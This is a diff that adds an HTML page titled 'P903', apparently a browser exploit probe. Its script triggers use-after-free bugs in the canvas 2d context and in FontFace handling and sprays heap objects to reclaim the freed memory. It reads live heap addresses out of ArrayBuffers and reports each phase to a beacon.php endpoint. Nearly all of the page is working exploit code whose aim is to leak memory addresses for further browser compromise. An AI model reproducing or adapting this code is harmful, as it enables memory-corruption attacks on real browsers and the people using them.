@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P903: Reentrant Save-Count Desync & StateStack Topology Probe</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P903...</div>
+<h2>P903: Reentrant Save-Count Desync & StateStack Topology Probe</h2>
+<pre id="log">Initializing diagnostic probe P903...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P903-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('[*] Probe P903 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: Reentrant Multi-Save Inside Canvas UAF Trigger
+ * ============================================================ */
+var innerCtx1 = null;
+var preSaveLw = -1;
+
+var c1 = document.createElement('canvas');
+c1.width = 32; c1.height = 32;
+var opts1 = {};
+Object.defineProperty(opts1, 'alpha', {
+  get: function() {
+    innerCtx1 = c1.getContext('2d');
+    innerCtx1.lineWidth = 1111.0;
+    // Push 4 frames before context is freed!
+    innerCtx1.save();
+    innerCtx1.save();
+    innerCtx1.save();
+    innerCtx1.save();
+    innerCtx1.lineWidth = 4444.0;
+    preSaveLw = innerCtx1.lineWidth; // forces realizeSaves()
+    return true;
+  }
+});
+c1.getContext('bitmaprenderer', opts1);
+
+log('[+] Phase 1: Inner Context Pre-Saved: preLw=' + preSaveLw, 'ok');
+syncBn('PRE-SAVE', 'preLw=' + preSaveLw);
+
+/* ============================================================
+ * PHASE 2: Same-Type Context Reclaim Spray
+ * ============================================================ */
+var sprayCtxs = [];
+for (var s = 0; s < 200; s++) {
+  var c = document.createElement('canvas');
+  c.width = 32; c.height = 32;
+  var ctx = c.getContext('2d');
+  ctx.lineWidth = 2000.0 + s;
+  sprayCtxs.push(ctx);
+}
+
+var idx1 = -1;
+var aliasReadLw = -1;
+try {
+  var lw1 = innerCtx1.lineWidth;
+  aliasReadLw = lw1;
+  if (lw1 >= 2000.0 && lw1 < 2200.0) {
+    idx1 = Math.round(lw1 - 2000.0);
+  }
+} catch(e) {}
+
+log('[+] Phase 2: Same-Type Reclaim: idx1=' + idx1 + ' | innerLw=' + aliasReadLw, idx1 >= 0 ? 'ok' : 'info');
+syncBn('ALIAS-HIT', 'idx1=' + idx1 + '|readLw=' + aliasReadLw);
+
+/* ============================================================
+ * PHASE 3: Asymmetric Restore & Cross-Wrapper Desync Execution
+ * ============================================================ */
+var restoreLog = [];
+var crossSyncOk = false;
+
+if (idx1 >= 0 && sprayCtxs[idx1]) {
+  try {
+    // 1. Initial underflow test: pop frame via dangling innerCtx1
+    innerCtx1.restore();
+    restoreLog.push('pop1:in=' + innerCtx1.lineWidth + ',al=' + sprayCtxs[idx1].lineWidth);
+
+    for (var p = 2; p <= 4; p++) {
+      innerCtx1.restore();
+      restoreLog.push('pop' + p + ':in=' + innerCtx1.lineWidth + ',al=' + sprayCtxs[idx1].lineWidth);
+    }
+
+    // 2. Cross-wrapper synchronization test:
+    // Push new frame via alias context, mutate via innerCtx1, restore via alias context
+    sprayCtxs[idx1].save();
+    sprayCtxs[idx1].lineWidth = 7777.5;
+    var readViaInner = innerCtx1.lineWidth;
+
+    innerCtx1.lineWidth = 8888.25;
+    var readViaAlias = sprayCtxs[idx1].lineWidth;
+
+    innerCtx1.restore();
+    var postPopInner = innerCtx1.lineWidth;
+    var postPopAlias = sprayCtxs[idx1].lineWidth;
+
+    restoreLog.push('cross:inR=' + readViaInner + ',alR=' + readViaAlias + ',popIn=' + postPopInner + ',popAl=' + postPopAlias);
+    if (readViaInner === 7777.5 && readViaAlias === 8888.25 && postPopAlias === 2000.0 + idx1) {
+      crossSyncOk = true;
+    }
+  } catch(e) {
+    restoreLog.push('err=' + (e.message || '').slice(0, 40));
+  }
+}
+
+log('[+] Phase 3: Restore & Cross-Sync: ok=' + crossSyncOk + ' | ' + restoreLog.join('; '), crossSyncOk ? 'hot' : 'info');
+syncBn('RESTORE-TEST', 'ok=' + crossSyncOk + '|log=' + restoreLog.join(';'));
+
+/* ============================================================
+ * PHASE 4: Single-Pass FontFace UAF (Capture Live Heap Base)
+ * ============================================================ */
+var st = document.createElement('style');
+st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+
+var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs = [], ffired = false;
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffired) return undefined;
+    ffired = true;
+
+    if (st) { st.remove(); st.textContent = ''; st = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+
+    fabs = [];
+    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bb1'); } catch(e) {}
+    document.body.offsetHeight;
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em f1, bb1', 'AB');
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+
+  var bestI = -1, bestNz = 0;
+  for (var i = 0; i < fabs.length; i++) {
+    var u = new Uint8Array(fabs[i]), nz = 0;
+    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+    if (nz > bestNz) { bestNz = nz; bestI = i; }
+  }
+
+  var Hstr = 'unknown', q13str = 'unknown';
+  var H_hi = 0, H_lo = 0;
+  var delta = 0;
+
+  if (bestI >= 0 && bestNz >= 4) {
+    var fontDV = new DataView(fabs[bestI]);
+    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
+    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
+    if (q11hi !== 0) {
+      var borrow = (q11lo < 0x68) ? 1 : 0;
+      H_hi = q11hi - borrow;
+      H_lo = (q11lo - 0x68) >>> 0;
+      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+    }
+    if (q13hi !== 0) {
+      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
+    }
+    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
+      delta = H_lo - q13lo;
+    }
+  }
+
+  log('[+] Phase 4: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Delta=' + delta + 'B, Slot #' + bestI + ')', 'ok');
+  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);
+
+  /* ============================================================
+   * SUMMARY
+   * ============================================================ */
+  banner.style.background = '#238636';
+  banner.textContent = 'STATUS: P903 COMPLETE (100% STABLE)';
+  log('----------------------------------------------------', 'info');
+  log('[*] Probe P903 Completed Cleanly', 'hot');
+  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
+  log('    - Pre-Save Lw: ' + preSaveLw + ' | Alias Lw: ' + aliasReadLw, 'ok');
+  log('    - Cross-Sync: ' + crossSyncOk + ' | Log: ' + restoreLog.slice(0, 3).join('; '), 'hot');
+  log('----------------------------------------------------', 'info');
+
+  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|crossOk=' + crossSyncOk + '|idx1=' + idx1 + '|resLog=' + restoreLog.slice(0, 3).join(';'));
+
+}, 600);
+</script>
+</body>
+</html>
